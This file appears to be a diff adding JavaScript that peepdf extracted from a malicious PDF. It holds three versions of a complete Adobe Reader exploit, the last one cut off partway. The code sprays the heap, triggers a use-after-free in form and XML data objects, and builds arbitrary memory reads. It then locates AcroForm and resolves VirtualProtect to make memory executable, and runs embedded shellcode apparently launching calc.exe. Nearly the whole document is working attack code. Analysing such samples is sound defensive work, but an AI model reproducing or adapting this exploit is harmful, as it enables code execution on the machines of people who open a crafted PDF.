@@ -1,0 +1,947 @@
+// peepdf comment: Javascript code located in object 508 (version 0)
+
+var mem_arr = new Array(0x3000);
+var mem_arr1 = new Array(0x1000);
+var fill_heap = new Array(0x5000);
+var buf_arr = new Array(0x300);
+var dvshellbuf;
+var fake_arr;
+var base_mem = 0;
+var base_addr = 0;
+var viewer = 0;
+var AcroForm_Base = 0;
+var myfieldaddress;
+var dllName = new Uint8Array([0x6B, 0x65, 0x72, 0x6E, 0x65, 0x6C, 0x33, 0x32, 0x2E, 0x64, 0x6C, 0x6C, 0]);
+var funcName = new Uint8Array([0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6C, 0x50, 0x72, 0x6F, 0x74, 0x65, 0x63, 0x74, 0]);
+var beforevftable;
+var addr, xaddr;
+var read_array;
+var fakeIdx = 1;
+
+var field_arr = new Array(0x100);
+
+function kk(addr) {
+
+    var arbAddr = viewer[2] - base_addr;
+    var memView = new DataView(base_mem);
+    var old = memView.getUint8(arbAddr + 0x50);
+    old = (old << 8) + memView.getUint8(arbAddr + 0x51);
+    old = (old << 8) + memView.getUint8(arbAddr + 0x52);
+    old = (old << 8) + memView.getUint8(arbAddr + 0x53);
+    memView.setUint32(arbAddr + 0x50, addr, true);
+    var ret = read_array[0];
+    memView.setUint32(arbAddr + 0x50, old, true);
+    return ret;
+}
+
+function jj() {
+
+    for (var i = 0; i < 0x3000; i++) {
+        if (mem_arr[i].byteLength < 0) {
+            fakeIdx = i;
+            break;
+        }
+    }
+    base_mem = mem_arr[fakeIdx];
+    viewer = new Uint32Array(mem_arr[fakeIdx - 1], 0x37D8, 0x20);
+    var arb_Addr = viewer[2];
+    var field_Addr = viewer[0];
+}
+
+function ii() {
+
+    addr = kk(base_addr + 0x8);
+    addr = kk(addr + 0x10);
+    addr = kk(addr + 0x10);
+    addr = kk(addr + 0x0C);
+    beforevftable = kk(addr + 4);
+    addr = kk(beforevftable);
+
+    AcroForm_Base = (addr - 0x60000) & 0xFFFFF000;
+    while (kk(AcroForm_Base) != 0x905A4D) {
+        AcroForm_Base -= 0x1000;
+    }
+}
+
+
+function hh() {
+
+    var addesobject = kk(base_addr + 0x10);
+    var dv = new DataView(mem_arr[fakeIdx - 1]);
+    for (i = 0; i < 8; i++) {
+        dv.setUint32(4 * i, kk(addesobject + i * 4), true);
+    }
+}
+
+function gg() {
+
+    var e_lfanew = kk(AcroForm_Base + 0x3C);
+    var imgNtHdr = AcroForm_Base + e_lfanew;
+    if (kk(imgNtHdr) != 0x4550) {
+        return 0;
+    }
+
+    var sizeofOptionalHdr = kk(imgNtHdr + 0x14) & 0xFFFF;
+    var sectionHdr = imgNtHdr + sizeofOptionalHdr + 0x18;
+    while (kk(sectionHdr) != 0x7865742E) {
+        sectionHdr += 0x28;
+        if (kk(sectionHdr + 0xC) == 0) {
+            return 0;
+        }
+    }
+
+    var retArray = new Array(4);
+    retArray[0] = AcroForm_Base + kk(sectionHdr + 0x0C);
+    retArray[1] = kk(sectionHdr + 0x10);
+
+    var dataDir = imgNtHdr + 0x18 + 0x60;
+    retArray[2] = AcroForm_Base + kk(dataDir + 8);
+    retArray[3] = kk(dataDir + 0x0C);
+
+    return retArray;
+}
+
+function ff(addr, size, target) {
+
+    var viewText = new Uint8Array(base_mem, addr - base_addr, size);
+    var alertnum = 0;
+    for (var i = 0; i < size - target.length; i++) {
+        var breaked = false;
+        for (var j = 0; j < target.length; j++) {
+            var v = viewText[i + j];
+            if (alertnum < 3) {
+                alertnum++;
+            }
+
+            if (v != target[j]) {
+                breaked = true;
+                break;
+            }
+        }
+
+        if (!breaked) {
+            return i + addr;
+        }
+    }
+
+    return 0;
+}
+
+function ee(iatAddr, iatSize, dllName, funcName) {
+
+    var dirAddr = iatAddr;
+    var bFind = false;
+    while (kk(dirAddr + 0x10) != 0) {
+        var dllNameAddr = kk(dirAddr + 0x0C) + AcroForm_Base;
+        var idx = 0;
+        var breaked = false;
+        var a = kk(dllNameAddr) & 0xFF;
+        while (a != 0) {
+            if (a != dllName[idx] && a + 0x20 != dllName[idx]) {
+                breaked = true;
+                break;
+            }
+            idx++;
+            dllNameAddr++;
+            if (idx > dllName.length) {
+                breaked = true;
+                break;
+            }
+
+            a = kk(dllNameAddr) & 0xFF;
+        }
+
+        if (!breaked) {
+            bFind = true;
+            break;
+        }
+        dirAddr += 0x14;
+    }
+
+    if (!bFind) {
+        return 0;
+    }
+
+    var iatNames = kk(dirAddr) + AcroForm_Base;
+    var iatAddrs = kk(dirAddr + 0x10) + AcroForm_Base;
+    var funcNameAddr = kk(iatNames) + AcroForm_Base;
+    while (funcNameAddr != 0) {
+        funcNameAddr += 2;
+        var a = kk(funcNameAddr) & 0xFF;
+        var idx = 0;
+        var breaked = false;
+        while (a != 0) {
+            if (a != funcName[idx]) {
+                breaked = true;
+                break;
+            }
+
+            idx++;
+            if (idx > funcName.length) {
+                breaked = true;
+                break;
+            }
+            funcNameAddr++;
+            a = kk(funcNameAddr) & 0xFF;
+        }
+
+        if (!breaked) {
+            return kk(iatAddrs);
+        }
+
+        iatNames += 4;
+        iatAddrs += 4;
+        funcNameAddr = kk(iatNames) + AcroForm_Base;
+    }
+
+    return 0;
+}
+
+function dd() {
+
+    var arbAddr = viewer[2] - base_addr;
+    var memView = new DataView(base_mem);
+    var old = memView.getUint8(arbAddr + 0x50);
+    old = (old << 8) + memView.getUint8(arbAddr + 0x51);
+    old = (old << 8) + memView.getUint8(arbAddr + 0x52);
+    old = (old << 8) + memView.getUint8(arbAddr + 0x53);
+    memView.setUint32(arbAddr + 0x50, xaddr, true);
+    read_array[0] = base_addr + 0x8000;
+    memView.setUint32(arbAddr + 0x50, old, true);
+}
+var xfuncaddr;
+
+function c() {
+
+    xaddr = kk(base_addr + 0x20);
+    xaddr = kk(xaddr + 0x10);
+    xaddr = kk(xaddr + 0x10);
+    xaddr = kk(xaddr + 0x4);
+    xaddr = kk(xaddr + 0x4);
+    if (kk(xaddr + 0x34) == 0) {
+        xfuncaddr = kk(xaddr);
+    } else {
+        xaddr = kk(xaddr + 0x34);
+        xfuncaddr = kk(xaddr);
+    }
+
+}
+
+function b() {
+
+    for (var i = 0; i < 0x5000; i++) {
+        fill_heap[i] = unescape("%u5050%u2020%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030");
+    }
+
+    var cXMLDoc = "<family name = 'Robat'>\
+<mom id = 'm3' name = 'Mary' gender='F'>\
+<spouse> m2 </spouse>\
+<personal>\
+<income>25000</income>\
+</personal>\
+</mom>\
+</family>";
+    var myXML = XMLData.parse(cXMLDoc, false);
+    var a = XMLData.applyXPath(myXML, "//family/mom");
+
+
+
+
+    fake_arr = this.dataObjects[0];
+    this.createDataObject("abname", "qwer");
+
+    var bChged = false;
+    for (var i = 1; i < 0x10000; i++) {
+        if (fake_arr[i] == 0x41424241) {
+            fake_arr[i - 2] = 0;
+            myfieldaddress = this.addField("FieldField", "text", 0, [0, 0, 10, 10]);
+            fake_arr[i + 1] = myfieldaddress;
+            fake_arr[i + 2] = this.getDataObject("abname");
+            fake_arr[i + 3] = shellbuf;
+            fake_arr[i + 4] = a;
+
+            base_addr = 0x30303830 + i * 8;
+            bChged = true;
+
+            var temp = new Array(0x1000);
+            for (var j = 0x1000; j >= 0; j--) {
+                temp[j] = new Array(0x100);
+            }
+
+            for (var j = i - 0x10; j >= 2; j--) {
+                fake_arr[j] = new ArrayBuffer(0x1000);
+            }
+            read_array = new Uint32Array(0x100);
+            fake_arr[1] = read_array;
+            break;
+        }
+    }
+
+    if (bChged) {
+        jj();
+        ii();
+        hh();
+        c();
+        var textRVA = gg();
+        var opCodes = new Uint8Array([0x94, 0xC3]);
+        var opCodeAddr = ff(textRVA[0], textRVA[1], opCodes);
+        var funcAddr = ee(textRVA[2], textRVA[3], dllName, funcName);
+
+        var frontvftable = kk(addr - 4);
+
+        var shellcdeaddr = kk(base_addr + 0x18);
+        shellcdeaddr = kk(shellcdeaddr + 0xc);
+
+        var expArrbuf = new DataView(base_mem, 0x8000, 0x1100);
+        for (i = 0; i < 0x300; i++) {
+            expArrbuf.setUint32(i * 4, kk(xfuncaddr + i * 4), true);
+        }
+        expArrbuf.setUint32(9 * 4, opCodeAddr, true);
+
+        expArrbuf.setUint32(0, funcAddr, true);
+        expArrbuf.setUint32(4, shellcdeaddr, true);
+        expArrbuf.setUint32(0x8, shellcdeaddr, true);
+        expArrbuf.setUint32(0xC, 0x1000, true);
+        expArrbuf.setUint32(0x10, 0x40, true);
+        expArrbuf.setUint32(0x14, 0x30303020, true);
+
+        expArrbuf.setUint32(0x1000, xaddr, true);
+        expArrbuf.setUint32(0x1004, xfuncaddr, true);
+
+        dd();
+
+        a.saveXML('pretty');
+
+    }
+
+    var dv2 = new DataView(mem_arr[fakeIdx - 1]);
+
+    for (k = 0; k < 8; k++) {
+        var old = dv2.getUint8(k * 4 + 3);
+        old = (old << 8) + dv2.getUint8(k * 4 + 2);
+        old = (old << 8) + dv2.getUint8(k * 4 + 1);
+        old = (old << 8) + dv2.getUint8(k * 4);
+        dv2.setUint32((3062 + k) * 4, old, true);
+    }
+}
+
+function a() {
+
+
+    for (var i = 0; i < 0x80; i++) {
+        field_arr[i] = this.addField("Field_" + i, "text", 0, [0, 800, 55, 850]);
+    }
+    for (var i = 0; i < 0x80; i++) {
+        this.removeField("Field_" + i);
+    }
+
+    for (var i = 0; i < 0x300; i++) {
+        buf_arr[i] = unescape("%u9584%u9584%u9648%u9640%u9648%u9640%u9648%u9640%u9648%u9640%u9648%u9640%u9648%u9640%u9648%u9640%u9648%u9640%u9648%u9640%u9648%u9640%u9648%u9640%u9648%u9640%u9648%u9640%u9648%u9648%u9648%u9648");
+        if (i == 0x250) this.dataObjects[0].toString();
+    }
+
+    for (var i = 0; i < 0x300; i++) {
+        delete buf_arr[i];
+        buf_arr[i] = null;
+    }
+    this.dataObjects[0] = null;
+    g_timeout = app.setTimeOut("b();", 10000);
+}
+
+for (var i = 0; i < 0x1000; i++) {
+    mem_arr1[i] = new ArrayBuffer(0x100);
+    var dv1 = new DataView(mem_arr1[i]);
+    dv1.setUint32(0, 0x41424241, true);
+    dv1.setUint32(4, 0xffffff81, true);
+}
+for (var i = 0; i < 0x3000; i++) {
+    mem_arr[i] = new ArrayBuffer(0xffe8);
+    var dv = new DataView(mem_arr[i]);
+    dv.setUint32(0, 0x41424241, true);
+    dv.setUint32(4, 0xffffff81, true);
+    dv.setUint32(0x2FD8, 0x30303060, true);
+    dv.setUint32(0x2FD8 + 4, 0x30303100, true);
+    dv.setUint32(0x2FD8 + 0xC, 0x30303830, true);
+    dv.setUint32(0x2FD8 + 0x24, 0x10000, true);
+
+    dv.setUint32(0x2FD8 + 0x30, 0x30303090, true);
+
+    dv.setUint32(0x2FD8 + 0x60, 0x303030C0, true);
+    dv.setUint32(0x2FD8 + 0x6C, 0x30303200, true);
+    dv.setUint32(0x2FD8 + 0x70, 0x1000, true);
+
+    dv.setUint32(0x2FD8 + 0x1E9, 1, true);
+
+    dv.setUint32(0x2FD8 + 0xD0, 0x30303130, true);
+
+    dv.setUint32(0x2FD8 + 0x800 - 0xC, 0x10000, true);
+    dv.setUint32(0x2FD8 + 0x800 - 0x8, 8, true);
+    dv.setUint32(0x2FD8 + 0x800 - 0x4, 0x10000, true);
+
+}
+var shellbuf = new ArrayBuffer(0x25000);
+
+var dvshell = new DataView(shellbuf);
+
+var dvshellbuf = new Uint32Array([0xEC8B5560, 0x000017E8, 0x8B615D00, 0x0CE883C5, 0x9058B894, 0x088B3031, 0x8904408B, 0x2460FF01, 0x83EC8B55, 0x565310EC, 0xEB5DEB57, 0x6C61635B, 0x78652E63, 0x55600065, 0x2C246C8B, 0x8B3C458B, 0x03780554, 0x184A8BD5, 0x03205A8B, 0x348B49DD, 0x33F5038B, 0xFCC033FF, 0x74C084AC, 0x0DCFC107, 0xF4EBF803, 0x28247C3B, 0x5A8BE375, 0x66DD0324, 0x8B4B0C8B, 0xDD031C5A, 0x038B048B, 0x45895DC5, 0x458B61F4, 0x0008C2F4, 0x81EC8B55, 0x001000EC, 0x0000E800, 0x835F0000, 0x06EB38C7, 0x05EA835A, 0xF5E805EB, 0x8DFFFFFF, 0xAB10F905, 0x89D02B00, 0x058DF855, 0x00AB108D, 0x89F84503, 0xC933F045, 0xA164C033, 0x00000030, 0x8B0C408B, 0x368B1C70, 0x8B08568B, 0x3966207E, 0xF275184F, 0x746B3F80, 0x4B3F8007, 0xE6EB0274, 0x330C7F80, 0x5589E075, 0xFC5D8BFC, 0x53FC5D8B, 0x8AFE9868, 0xF055FF0E, 0x1084058D, 0x450300AB, 0x50006AF8, 0x81F455FF, 0x001000C4, 0x5E5F5D00, 0x5DE58B5B, 0x909090C3]);
+
+for (var i = 0; i < dvshellbuf.length; i++) {
+    dvshell.setUint32(i * 4, dvshellbuf[i], true);
+}
+
+g_timeout = app.setTimeOut("a();", 3500);
+
+// peepdf comment: Javascript code located in object 530 (version 1)
+
+var fake_arr, myfieldaddress, beforevftable, addr, xaddr, read_array, xfuncaddr, mem_arr = new Array(12288),
+    mem_arr1 = new Array(4096),
+    fill_heap = new Array(20480),
+    buf_arr = new Array(768),
+    base_mem = 0,
+    base_addr = 0,
+    viewer = 0,
+    AcroForm_Base = 0,
+    dllName = new Uint8Array([107, 101, 114, 110, 101, 108, 51, 50, 46, 100, 108, 108, 0]),
+    funcName = new Uint8Array([86, 105, 114, 116, 117, 97, 108, 80, 114, 111, 116, 101, 99, 116, 0]),
+    fakeIdx = 1,
+    field_arr = new Array(256);
+
+function kk(e) {
+    var r = viewer[2] - base_addr,
+        a = new DataView(base_mem),
+        t = a.getUint8(r + 80);
+    t = ((t = ((t = (t << 8) + a.getUint8(r + 81)) << 8) + a.getUint8(r + 82)) << 8) + a.getUint8(r + 83), a.setUint32(r + 80, e, !0);
+    var i = read_array[0];
+    return a.setUint32(r + 80, t, !0), i
+}
+function jj() {
+    for (var e = 0; e < 12288; e++) if (mem_arr[e].byteLength < 0) {
+        fakeIdx = e;
+        break
+    }
+    base_mem = mem_arr[fakeIdx];
+    (viewer = new Uint32Array(mem_arr[fakeIdx - 1], 14296, 32))[2], viewer[0]
+}
+function ii() {
+    for (addr = kk((addr = kk((addr = kk((addr = kk(base_addr + 8)) + 16)) + 16)) + 12), beforevftable = kk(addr + 4), addr = kk(beforevftable), AcroForm_Base = addr - 393216 & 4294963200; 9460301 != kk(AcroForm_Base);) AcroForm_Base -= 4096
+}
+function hh() {
+    var e = kk(base_addr + 16),
+        r = new DataView(mem_arr[fakeIdx - 1]);
+    for (i = 0; i < 8; i++) r.setUint32(4 * i, kk(e + 4 * i), !0)
+}
+function gg() {
+    var e = kk(AcroForm_Base + 60),
+        r = AcroForm_Base + e;
+    if (17744 != kk(r)) return 0;
+    for (var a = r + (65535 & kk(r + 20)) + 24; 2019914798 != kk(a);) if (0 == kk((a += 40) + 12)) return 0;
+    var t = new Array(4);
+    t[0] = AcroForm_Base + kk(a + 12), t[1] = kk(a + 16);
+    var i = r + 24 + 96;
+    return t[2] = AcroForm_Base + kk(i + 8), t[3] = kk(i + 12), t
+}
+function ff(e, r, a) {
+    for (var t = new Uint8Array(base_mem, e - base_addr, r), i = 0, d = 0; d < r - a.length; d++) {
+        for (var n = !1, k = 0; k < a.length; k++) {
+            if (i < 3 && i++, t[d + k] != a[k]) {
+                n = !0;
+                break
+            }
+        }
+        if (!n) return d + e
+    }
+    return 0
+}
+function ee(e, r, a, t) {
+    for (var i = e, d = !1; 0 != kk(i + 16);) {
+        for (var n = kk(i + 12) + AcroForm_Base, k = 0, u = !1, f = 255 & kk(n); 0 != f;) {
+            if (f != a[k] && f + 32 != a[k]) {
+                u = !0;
+                break
+            }
+            if (n++, ++k > a.length) {
+                u = !0;
+                break
+            }
+            f = 255 & kk(n)
+        }
+        if (!u) {
+            d = !0;
+            break
+        }
+        i += 20
+    }
+    if (!d) return 0;
+    for (var s = kk(i) + AcroForm_Base, o = kk(i + 16) + AcroForm_Base, m = kk(s) + AcroForm_Base; 0 != m;) {
+        for (f = 255 & kk(m += 2), k = 0, u = !1; 0 != f;) {
+            if (f != t[k]) {
+                u = !0;
+                break
+            }
+            if (++k > t.length) {
+                u = !0;
+                break
+            }
+            f = 255 & kk(++m)
+        }
+        if (!u) return kk(o);
+        o += 4, m = kk(s += 4) + AcroForm_Base
+    }
+    return 0
+}
+function dd() {
+    var e = viewer[2] - base_addr,
+        r = new DataView(base_mem),
+        a = r.getUint8(e + 80);
+    a = ((a = ((a = (a << 8) + r.getUint8(e + 81)) << 8) + r.getUint8(e + 82)) << 8) + r.getUint8(e + 83), r.setUint32(e + 80, xaddr, !0), read_array[0] = base_addr + 32768, r.setUint32(e + 80, a, !0)
+}
+function c() {
+    0 == kk((xaddr = kk((xaddr = kk((xaddr = kk((xaddr = kk((xaddr = kk(base_addr + 32)) + 16)) + 16)) + 4)) + 4)) + 52) || (xaddr = kk(xaddr + 52)), xfuncaddr = kk(xaddr)
+}
+function b() {
+    for (var e = 0; e < 20480; e++) fill_heap[e] = unescape("%u5050%u2020%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030");
+    var r = XMLData.parse("<family name = 'Robat'><mom id = 'm3' name = 'Mary' gender='F'><spouse> m2 </spouse><personal><income>25000</income></personal></mom></family>", !1),
+        a = XMLData.applyXPath(r, "//family/mom");
+    fake_arr = this.dataObjects[0], this.createDataObject("abname", "qwer");
+    var t = !1;
+    for (e = 1; e < 65536; e++) if (1094861377 == fake_arr[e]) {
+        fake_arr[e - 2] = 0, myfieldaddress = this.addField("FieldField", "text", 0, [0, 0, 10, 10]), fake_arr[e + 1] = myfieldaddress, fake_arr[e + 2] = this.getDataObject("abname"), fake_arr[e + 3] = shellbuf, fake_arr[e + 4] = a, base_addr = 808466480 + 8 * e, t = !0;
+        for (var i = new Array(4096), d = 4096; 0 <= d; d--) i[d] = new Array(256);
+        for (d = e - 16; 2 <= d; d--) fake_arr[d] = new ArrayBuffer(4096);
+        read_array = new Uint32Array(256), fake_arr[1] = read_array;
+        break
+    }
+    if (t) {
+        jj(), ii(), hh(), c();
+        var n = gg(),
+            u = new Uint8Array([148, 195]),
+            f = ff(n[0], n[1], u),
+            s = ee(n[2], n[3], dllName, funcName),
+            o = (kk(addr - 4), kk(base_addr + 24));
+        o = kk(o + 12);
+        var m = new DataView(base_mem, 32768, 4352);
+        for (e = 0; e < 768; e++) m.setUint32(4 * e, kk(xfuncaddr + 4 * e), !0);
+        m.setUint32(36, f, !0), m.setUint32(0, s, !0), m.setUint32(4, o, !0), m.setUint32(8, o, !0), m.setUint32(12, 4096, !0), m.setUint32(16, 64, !0), m.setUint32(20, 808464416, !0), m.setUint32(4096, xaddr, !0), m.setUint32(4100, xfuncaddr, !0), dd(), a.saveXML("pretty")
+    }
+    var _ = new DataView(mem_arr[fakeIdx - 1]);
+    for (k = 0; k < 8; k++) {
+        var v = _.getUint8(4 * k + 3);
+        v = ((v = ((v = (v << 8) + _.getUint8(4 * k + 2)) << 8) + _.getUint8(4 * k + 1)) << 8) + _.getUint8(4 * k), _.setUint32(4 * (3062 + k), v, !0)
+    }
+}
+function a() {
+    for (var e = 0; e < 128; e++) field_arr[e] = this.addField("Field_" + e, "text", 0, [0, 800, 55, 850]);
+    for (e = 0; e < 128; e++) this.removeField("Field_" + e);
+    for (e = 0; e < 768; e++) buf_arr[e] = unescape("%u9584%u9584%u9648%u9640%u9648%u9640%u9648%u9640%u9648%u9640%u9648%u9640%u9648%u9640%u9648%u9640%u9648%u9640%u9648%u9640%u9648%u9640%u9648%u9640%u9648%u9640%u9648%u9640%u9648%u9648%u9648%u9648"), 592 == e && this.dataObjects[0].toString();
+    for (e = 0; e < 768; e++) delete buf_arr[e], buf_arr[e] = null;
+    this.dataObjects[0] = null, g_timeout = app.setTimeOut("b();", 1e4)
+}
+for (var i = 0; i < 4096; i++) {
+    mem_arr1[i] = new ArrayBuffer(256);
+    var dv1 = new DataView(mem_arr1[i]);
+    dv1.setUint32(0, 1094861377, !0), dv1.setUint32(4, 4294967169, !0)
+}
+for (i = 0; i < 12288; i++) {
+    mem_arr[i] = new ArrayBuffer(65512);
+    var dv = new DataView(mem_arr[i]);
+    dv.setUint32(0, 1094861377, !0), dv.setUint32(4, 4294967169, !0), dv.setUint32(12248, 808464480, !0), dv.setUint32(12252, 808464640, !0), dv.setUint32(12260, 808466480, !0), dv.setUint32(12284, 65536, !0), dv.setUint32(12296, 808464528, !0), dv.setUint32(12344, 808464576, !0), dv.setUint32(12356, 808464896, !0), dv.setUint32(12360, 4096, !0), dv.setUint32(12737, 1, !0), dv.setUint32(12456, 808464688, !0), dv.setUint32(14284, 65536, !0), dv.setUint32(14288, 8, !0), dv.setUint32(14292, 65536, !0)
+}
+var shellbuf = new ArrayBuffer(151552),
+    dvshell = new DataView(shellbuf),
+    dvshellbuf = new Uint32Array([3968554336, 6120, 2338413824, 216564677, 2421733524, 143339569, 2298757259, 610336513, 2213317461, 1448284396, 3948800855, 1818321755, 2019896931, 1432354917, 740584587, 2335982987, 58197332, 407538645, 52451979, 881543645, 871695243, 4240454655, 1958773932, 231719175, 4109105155, 673479739, 1519117173, 1725760292, 2336951435, 3707968602, 59442315, 1166630341, 1166762484, 574196, 2179763029, 1048812, 59392, 2204041216, 116078791, 99255130, 4125623787, 2382364671, 2870016261, 2312121088, 93190229, 11210893, 2314749187, 3375624261, 2707734579, 48, 2332835979, 915086448, 2332579467, 962994302, 4067760207, 1953185664, 1262452743, 3874161268, 856457088, 1435099253, 4233989116, 1409047947, 2331940968, 4032167694, 277087629, 1157824683, 1342204664, 2180273663, 1048772, 1583308032, 1575324507, 2425393347]);
+for (i = 0; i < dvshellbuf.length; i++) dvshell.setUint32(4 * i, dvshellbuf[i], !0);
+g_timeout = app.setTimeOut("a();", 3500);
+
+// peepdf comment: Javascript code located in object 533 (version 2)
+
+var mem_arr = new Array(0x3000);
+var mem_arr1 = new Array(0x1000);
+var fill_heap = new Array(0x5000);
+var buf_arr = new Array(0x300);
+var dvshellbuf;
+var fake_arr;
+var base_mem = 0;
+var base_addr = 0;
+var viewer = 0;
+var AcroForm_Base = 0;
+var myfieldaddress;
+var dllName = new Uint8Array([0x6B, 0x65, 0x72, 0x6E, 0x65, 0x6C, 0x33, 0x32, 0x2E, 0x64, 0x6C, 0x6C, 0]);
+var funcName = new Uint8Array([0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6C, 0x50, 0x72, 0x6F, 0x74, 0x65, 0x63, 0x74, 0]);
+var beforevftable;
+var addr, xaddr;
+var read_array;
+var fakeIdx = 1;
+
+var field_arr = new Array(0x100);
+
+function kk(addr) {
+
+    var arbAddr = viewer[2] - base_addr;
+    var memView = new DataView(base_mem);
+    var old = memView.getUint8(arbAddr + 0x50);
+    old = (old << 8) + memView.getUint8(arbAddr + 0x51);
+    old = (old << 8) + memView.getUint8(arbAddr + 0x52);
+    old = (old << 8) + memView.getUint8(arbAddr + 0x53);
+    memView.setUint32(arbAddr + 0x50, addr, true);
+    var ret = read_array[0];
+    memView.setUint32(arbAddr + 0x50, old, true);
+    return ret;
+}
+
+function jj() {
+
+    for (var i = 0; i < 0x3000; i++) {
+        if (mem_arr[i].byteLength < 0) {
+            fakeIdx = i;
+            break;
+        }
+    }
+    base_mem = mem_arr[fakeIdx];
+    viewer = new Uint32Array(mem_arr[fakeIdx - 1], 0x37D8, 0x20);
+    var arb_Addr = viewer[2];
+    var field_Addr = viewer[0];
+}
+
+function ii() {
+
+    addr = kk(base_addr + 0x8);
+    addr = kk(addr + 0x10);
+    addr = kk(addr + 0x10);
+    addr = kk(addr + 0x0C);
+    beforevftable = kk(addr + 4);
+    addr = kk(beforevftable);
+
+    AcroForm_Base = (addr - 0x60000) & 0xFFFFF000;
+    while (kk(AcroForm_Base) != 0x905A4D) {
+        AcroForm_Base -= 0x1000;
+    }
+}
+
+
+function hh() {
+
+    var addesobject = kk(base_addr + 0x10);
+    var dv = new DataView(mem_arr[fakeIdx - 1]);
+    for (i = 0; i < 8; i++) {
+        dv.setUint32(4 * i, kk(addesobject + i * 4), true);
+    }
+}
+
+function gg() {
+
+    var e_lfanew = kk(AcroForm_Base + 0x3C);
+    var imgNtHdr = AcroForm_Base + e_lfanew;
+    if (kk(imgNtHdr) != 0x4550) {
+        return 0;
+    }
+
+    var sizeofOptionalHdr = kk(imgNtHdr + 0x14) & 0xFFFF;
+    var sectionHdr = imgNtHdr + sizeofOptionalHdr + 0x18;
+    while (kk(sectionHdr) != 0x7865742E) {
+        sectionHdr += 0x28;
+        if (kk(sectionHdr + 0xC) == 0) {
+            return 0;
+        }
+    }
+
+    var retArray = new Array(4);
+    retArray[0] = AcroForm_Base + kk(sectionHdr + 0x0C);
+    retArray[1] = kk(sectionHdr + 0x10);
+
+    var dataDir = imgNtHdr + 0x18 + 0x60;
+    retArray[2] = AcroForm_Base + kk(dataDir + 8);
+    retArray[3] = kk(dataDir + 0x0C);
+
+    return retArray;
+}
+
+function ff(addr, size, target) {
+
+    var viewText = new Uint8Array(base_mem, addr - base_addr, size);
+    var alertnum = 0;
+    for (var i = 0; i < size - target.length; i++) {
+        var breaked = false;
+        for (var j = 0; j < target.length; j++) {
+            var v = viewText[i + j];
+            if (alertnum < 3) {
+                alertnum++;
+            }
+
+            if (v != target[j]) {
+                breaked = true;
+                break;
+            }
+        }
+
+        if (!breaked) {
+            return i + addr;
+        }
+    }
+
+    return 0;
+}
+
+function ee(iatAddr, iatSize, dllName, funcName) {
+
+    var dirAddr = iatAddr;
+    var bFind = false;
+    while (kk(dirAddr + 0x10) != 0) {
+        var dllNameAddr = kk(dirAddr + 0x0C) + AcroForm_Base;
+        var idx = 0;
+        var breaked = false;
+        var a = kk(dllNameAddr) & 0xFF;
+        while (a != 0) {
+            if (a != dllName[idx] && a + 0x20 != dllName[idx]) {
+                breaked = true;
+                break;
+            }
+            idx++;
+            dllNameAddr++;
+            if (idx > dllName.length) {
+                breaked = true;
+                break;
+            }
+
+            a = kk(dllNameAddr) & 0xFF;
+        }
+
+        if (!breaked) {
+            bFind = true;
+            break;
+        }
+        dirAddr += 0x14;
+    }
+
+    if (!bFind) {
+        return 0;
+    }
+
+    var iatNames = kk(dirAddr) + AcroForm_Base;
+    var iatAddrs = kk(dirAddr + 0x10) + AcroForm_Base;
+    var funcNameAddr = kk(iatNames) + AcroForm_Base;
+    while (funcNameAddr != 0) {
+        funcNameAddr += 2;
+        var a = kk(funcNameAddr) & 0xFF;
+        var idx = 0;
+        var breaked = false;
+        while (a != 0) {
+            if (a != funcName[idx]) {
+                breaked = true;
+                break;
+            }
+
+            idx++;
+            if (idx > funcName.length) {
+                breaked = true;
+                break;
+            }
+            funcNameAddr++;
+            a = kk(funcNameAddr) & 0xFF;
+        }
+
+        if (!breaked) {
+            return kk(iatAddrs);
+        }
+
+        iatNames += 4;
+        iatAddrs += 4;
+        funcNameAddr = kk(iatNames) + AcroForm_Base;
+    }
+
+    return 0;
+}
+
+function dd() {
+
+    var arbAddr = viewer[2] - base_addr;
+    var memView = new DataView(base_mem);
+    var old = memView.getUint8(arbAddr + 0x50);
+    old = (old << 8) + memView.getUint8(arbAddr + 0x51);
+    old = (old << 8) + memView.getUint8(arbAddr + 0x52);
+    old = (old << 8) + memView.getUint8(arbAddr + 0x53);
+    memView.setUint32(arbAddr + 0x50, xaddr, true);
+    read_array[0] = base_addr + 0x8000;
+    memView.setUint32(arbAddr + 0x50, old, true);
+}
+var xfuncaddr;
+
+function c() {
+
+    xaddr = kk(base_addr + 0x20);
+    xaddr = kk(xaddr + 0x10);
+    xaddr = kk(xaddr + 0x10);
+    xaddr = kk(xaddr + 0x4);
+    xaddr = kk(xaddr + 0x4);
+    if (kk(xaddr + 0x34) == 0) {
+        xfuncaddr = kk(xaddr);
+    } else {
+        xaddr = kk(xaddr + 0x34);
+        xfuncaddr = kk(xaddr);
+    }
+
+}
+
+function b() {
+
+    for (var i = 0; i < 0x5000; i++) {
+        fill_heap[i] = unescape("%u5050%u2020%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030%u3030");
+    }
+
+    var cXMLDoc = "<family name = 'Robat'>\
+<mom id = 'm3' name = 'Mary' gender='F'>\
+<spouse> m2 </spouse>\
+<personal>\
+<income>25000</income>\
+</personal>\
+</mom>\
+</family>";
+    var myXML = XMLData.parse(cXMLDoc, false);
+    var a = XMLData.applyXPath(myXML, "//family/mom");
+
+
+
+
+    fake_arr = this.dataObjects[0];
+    this.createDataObject("abname", "qwer");
+
+    var bChged = false;
+    for (var i = 1; i < 0x10000; i++) {
+        if (fake_arr[i] == 0x41424241) {
+            fake_arr[i - 2] = 0;
+            myfieldaddress = this.addField("FieldField", "text", 0, [0, 0, 10, 10]);
+            fake_arr[i + 1] = myfieldaddress;
+            fake_arr[i + 2] = this.getDataObject("abname");
+            fake_arr[i + 3] = shellbuf;
+            fake_arr[i + 4] = a;
+
+            base_addr = 0x30303830 + i * 8;
+            bChged = true;
+
+            var temp = new Array(0x1000);
+            for (var j = 0x1000; j >= 0; j--) {
+                temp[j] = new Array(0x100);
+            }
+
+            for (var j = i - 0x10; j >= 2; j--) {
